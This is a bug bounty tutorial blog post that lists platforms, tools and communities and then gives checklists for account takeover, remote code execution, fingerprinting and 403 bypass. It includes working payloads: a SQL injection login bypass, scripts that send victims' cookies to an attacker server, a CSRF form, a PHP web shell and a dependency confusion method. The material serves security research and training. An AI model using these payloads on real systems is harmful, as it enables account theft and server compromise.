---
title: "Bugbounty Resources and Tools"
description: "Bugbounty Resources to get started with bug bounty hunting and security research. Learn about the tools and resources that can help you..."
slug: "bugbounty-resources-2024"
date: "2024-03-01"
author: "Waseem Akram"
image: "/images/posts/bugbounty/bugbounty.png"
---

![BugBounty](/images/posts/bugbounty/bugbounty.png)

Bug bounty programs are a great way to earn money by finding and reporting security vulnerabilities in web applications and software. If you're interested in bug bounty hunting and security research, there are a number of resources and tools that can help you get started. In this article, we'll explore some of the best bug bounty resources and tools that you can use to enhance your skills and find more bugs.

## Bug Bounty Platforms

There are several bug bounty platforms that host bug bounty programs from various companies. These platforms provide a marketplace for security researchers to find and report vulnerabilities in exchange for rewards. Some of the popular bug bounty platforms include:

1. **HackerOne**: HackerOne is one of the largest bug bounty platforms, hosting programs from companies like Google, Microsoft, and PayPal.

2. **Bugcrowd**: Bugcrowd is another popular bug bounty platform that hosts programs from companies like Mastercard, Fitbit, and Tesla.

3. **Synack**: Synack is a crowdsourced security platform that connects security researchers with companies looking to improve their security posture.

4. **Intigriti**: Intigriti is a bug bounty platform that hosts programs from companies like Spotify, Dropbox, and Airbnb.

## Bug Bounty Tools

In addition to bug bounty platforms, there are several tools that can help you find and report security vulnerabilities. Some of the popular bug bounty tools include:

1. **Burp Suite**: Burp Suite is a web application security testing tool that can help you find vulnerabilities like SQL injection, cross-site scripting, and more.

2. **Nmap**: Nmap is a network scanning tool that can help you discover hosts and services on a network.

3. **Metasploit**: Metasploit is a penetration testing framework that can help you test the security of web applications and networks.

4. **Sublist3r**: Sublist3r is a subdomain enumeration tool that can help you find subdomains of a target domain.

## Bug Bounty Communities

Bug bounty communities are a great way to connect with other security researchers, share knowledge, and learn from each other. Some of the popular bug bounty communities include:

1. **Bugcrowd Forum**: The Bugcrowd Forum is a community of security researchers who share tips, tricks, and resources for bug bounty hunting.

2. **HackerOne Community**: The HackerOne Community is a forum where security researchers can ask questions, share knowledge, and collaborate on bug bounty programs.

3. **Reddit Bug Bounty**: The Reddit Bug Bounty community is a subreddit where security researchers can discuss bug bounty programs, tools, and resources.

4. **Twitter**: Twitter is a great platform to connect with other security researchers, share your findings, and stay up to date on the latest bug bounty programs.

## Bug Bounty Resources


## Account Takeover Checklist

* **login:**
  - check if you are able to brute force the password
  - Test for OAuth misconfigurations
  - check if you are able to bruteforce the login OTP
  - check for JWT mesconfigurations
  - Test for SQL injection to bypass authentication.<br> `admin" or 1=1;--`
  - check if the application validates the OTP or Token
* **password reset:**
  - check if you are able to brute force the password reset OTP.
  - test for token predectability.
  - test for JWT misconfigurations.
  - check if the password reset endpoint is vulnerable to IDOR.
  - check if the password reset endpoint is vulnerable to Host Header injection.
  - check if the password reset endpoint is leaking the token or OTP in the HTTP response.
  - check if the application validates the OTP or Token.
  - test for HTTP parameter Pollution (HPP).
* **XSS to Account Takeover:**
  - if the application does not use auth token or you can't access the cookies because the "HttpOnly" flag, you can obtain the CSRF token and craft a request to change the user's email or password
  - try to exfiltrate the cookies
  - try to exfiltrate the Auth Token
  - if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies PoC Example:

```js showLineNumbers
<script>
  /*
  this script will create a hidden <img> element
  when the browser tries to load the image the victim's cookies
  will be sent to your server
  */
  var new_img = document.createElement('img');
  new_img.src = "http://yourserver/" + document.cookie;
  new_img.style = 'display: none;'
  document.body.appendChild(new_img);
</script>
```
* **CSRF to Account Takeover:**
  - check if the email update endpoint is vulnerable to CSRF
  - check if the password update endpoint is vulnerable to CSRF
  - PoC Example:

```html showLineNumbers
<html>
  <head>
    <title>CSRF PoC</title>
  </head>
  <body>
      <form name='attack' action='https://example.com/update-email' method='POST'>
           <input type="hidden" name="new_email" value="attacker@evil.com">
           <input type="submit" name="submit" value="submit" hidden>
      </form>
      <script>
           document.attack.submit.click()
      </script>
  </body>
  </html>
```
* **IDOR to Account Takerover**
  - checck if the email update endpoint is vulnerable to IDOR
  - check if the password change endpoint is vulnerable to IDOR
  - check if the password reset endpoint vulnerable to IDOR
* **subdomain takeover:**
  - first-order: check if you can takeover xyz.example.com, you can host any malicious code to steal users info or cookies
  - PoC Example

```python showLineNumbers
#python
#!/usr/bin/python3
from flask import *
app = Flask(__name__)
@app.route('/')
def cookie_sniffer():
    for c_name, c_value in request.cookies.items():
        print(c_name + ': ' + c_value)
    return 'Hello, world'
if __name__ == '__main__':
    app.run(port= showLineNumbers80)
```

  - second-order (broken link hijacking): if you found a broken link in a webpage (https://nonexistentlink.com/app.js) and you can takeover this domain, you can host any malicious javascript file and use it to steal users info or cookies
  - PoC Example

```js showLineNumbers
//javascript
  user_cookies = {
    "cookies": document.cookie
}
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "/store-cookies", true);
xhttp.send(JSON.stringify(user_cookies));
```

***

## Remote Code/Command Execution (RCE) Checklist

* **Server Side Request Forgery (SSRF) to RCE:**
  - if you found an SSRF try to escalate it to RCE by interacting with internal services, to do this you can craft a Gopher payload to interact with services like MySQL, you can use [Gopherus](https://github.com/tarunkant/Gopherus)
* **File Upload to RCE:**
  - if you found an unrestricted file upload vulnerability try to upload a malicious file to get a reverse shell.
  - PoC Example:

```php showLineNumbers
#php
<?php system($_GET["cmd"]);?>
```
* **Dependency Confusion Attack:**
  - Search for packages that may be used internally by your target, then register a malicious public package with the same name, you can use [confused](https://github.com/visma-prodsec/confused) tool.
* **Server Side Template Injection (SSTI) to RCE:**
  - if you found and SSTI you can exploit it with [tplmap](https://github.com/epinna/tplmap) to get an RCE
* **SQL Injection To RCE:**
  - if you found an SQL injection, you can craft a special query to write an arbitrary file on the system,[SQL Injection shell](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#shell).
* **Latex Injection To RCE:**
  - if you found a web-based Latex Compiler, test If it is vulnerable to RCE, Latex to [command execution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection#command-execution).
* **Local File Inclusion (LFI) to RCE:**
  - if you found an LFI try to escalate it to RCE via these [methods](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-procfd) and you can automate the process using [liffy](and you can automate the process using)
* **Insecure deserialization to RCE:**
  - check if the application is vulnerable to Insecure deserialization
  - how to identify if the app is vulnerable:
    + try to find out the language used to build the application.
    + learn about the methods used to serialize and deserialize data in this language.
    + by analyzing the data that comes from the application you can identify the method.
    + try to craft a special payload to get and RCE
  - check this [cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
  - [Java Deserialization Scanner](https://github.com/PortSwigger/java-deserialization-scanner) : a Burp Suite plugin to detect and exploit Java deserialization vulnerabilities.

***

## Web Applications Fingerprinting tools

* **wappaylzer**
  - you can use wappaylyzer extension for [firefox](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/) or [chrome](https://chrome.google.com/webstore/search/wappalyzer) browsers for web apps fingerprinting.
* **builtwith**
  - you can use builtwith extension for [firefox](https://addons.mozilla.org/en-US/firefox/addon/builtwith/) or [chrome](https://chrome.google.com/webstore/detail/builtwith-technology-prof/dapjbgnjinbpoindlpdmhochffioedbn) browsers for web apps fingerprinting.
* **httpx**
  - you can use `-web-server` and `-tech-detect` options

```bash showLineNumbers
#bash
# a single domain
echo example.com | httpx -web-server -tech-detect

# a list of subdomins
cat subdomains_list.txt | httpx -web-server -tech-detect

httpx -l subdomains_list.txt -web-server -tech-detect
```
* **Aquatone**
  - [Aquatone](https://github.com/michenriksen/aquatone)is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.

```bash showLineNumbers
#bash
cat hosts.txt | aquatone
```
* **nuclei**
  - [nuclei](https://github.com/projectdiscovery/nuclei) project has a good list of [templates](https://github.com/projectdiscovery/nuclei-templates) to fingerprint web apps.

```bash showLineNumbers
#bash
nuclei -t ~/nuclei-templates -tags tech -u https://example.com -c 200
```
* **whatweb**
  - has an 1800 plugin to identify technologies, you can use it to fingerprint web apps

```bash showLineNumbers
#bash
# a single host
whatweb example.com

# a list of hosts
whatweb --input-file=hosts.txt
```
* **Error messages**
  - you can identify technologies via error messages, if a web app does not handle errors, and you sent malformed data to the web app, this data will cause an error, and this error may reveal the back-end technology.

```http showLineNumbers
#http
POST / HTTP/1.1
Host: example.com
User-Agent: curl/7.74.0
Accept: */*
Content-type: application/json
Content-Length: 8

{"test":d
```

you can enumerate the web app endpoints and start fuzzing them with different http methods, http headers, and body
  - fuzzing http methods

```http showLineNumbers
#http
METHOD /ENDPOINT HTTP/1.1
Host: example.com
User-Agent: curl/7.74.0
Accept: */*
```

```bash showLineNumbers
#bash
ffuf -w http_methods.txt:METHOD -w endpoints.txt:ENDPOINT -request http_request.txt
```

  - fuzzing http headers

```http showLineNumbers
#http
GET /ENDPOINT HTTP/1.1
Host: example.com
User-Agent: curl/7.74.0
Accept: */*
```

```bash showLineNumbers
#bash
ffuf -w http_headers_names.txt:NAME -w http_headers_values.txt:VALUE -w endpoints.txt:ENDPOINT -request http_request.txt  -H "NAME: VALUE"
```

***

## 403 - Bypass

* **FFUF**
  - Path fuzzing

```bash showLineNumbers
#bash
ffuf -w 403_url_payloads.txt -u http://example.com/auth_pathFUZZ -fc 403,401,400
```

  - HTTP Header Fuzzing

```bash showLineNumbers
#bash
ffuf -w 403_bypass_header_names.txt:HEADER -w 403_bypass_header_values.txt:VALUE -u http://example.com/auth_path -H "HEADER:VALUE" -fc 403,401,400
```

  - Common HTTP Ports Fuzzing

```bash showLineNumbers
#bash
ffuf -w common-http-ports.txt:PORT -u http://example.com/auth_path -H "Host: example.com:PORT" -fc 403,401,400
```

  - HTTP Methods Fuzzing

```bash showLineNumbers
#bash
ffuf -w http-methods.txt:METHOD -u http://example.com/auth_path -X "METHOD" -fc 403,401,400
```

  - User Agent Fuzzing

```bash showLineNumbers
#bash
ffuf -w user-agents.txt:AGENT -u http://example.com/auth_path -H "User-Agent: AGENT" -fc 403,401,400
```

***

## nuclei

```bash showLineNumbers
#bash
nuclei -u http://example.com/auth_path/ -t 403-bypass-nuclei-templates -tags fuzz -timeout 10 -c 200 -v
```

**Note** : Add the slash symbol after the path whether it is a directory or file

**Example:**

* [http://example.com/directory/](http://example.com/directory/)
* [http://example.com/directory/file.ext/](http://example.com/directory/file.ext/)

**Source:**

* [Presentation file, click here to see](https://docs.google.com/presentation/d/1ek6DzXKBQd6xUiVNGRT33pMACs8M13CSoYCkgepDKZk/edit#slide=id.gaa5321e139_0_0)
* [403 Header payloads.](https://github.com/Karanxa/Bug-Bounty-Wordlists/blob/main/403_header_payloads.txt)
* [403 URL payloads](https://github.com/Karanxa/Bug-Bounty-Wordlists/blob/main/403_url_payloads.txt)
* [iamthefrogy/frogy/ports](https://github.com/iamthefrogy/frogy/blob/main/ports)
* [http methods](https://annevankesteren.nl/2007/10/http-methods)
* [User-Agents fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/User-Agents/UserAgents.fuzz.txt)

Thanks for reading this post, if you like my work you can support by [buying me a coffee](https://www.buymeacoffee.com/hackerwasii). ☕️
Read other posts

***